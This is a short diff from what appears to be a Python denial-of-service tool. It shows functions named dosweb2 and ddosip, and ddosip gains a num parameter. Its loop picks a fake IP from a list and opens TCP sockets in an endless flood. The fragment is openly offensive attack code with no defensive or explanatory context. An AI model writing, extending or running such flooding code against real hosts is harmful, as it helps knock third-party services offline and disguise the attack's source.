@@ -62,7 +62,7 @@ def dosweb2(target):
             print(colorama.Fore.RED + "[-] Connection error!")
 
 
-def ddosip():
+def ddosip(num):
     while True:
         fake_ip = random.choice(fakeip_list)
         r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
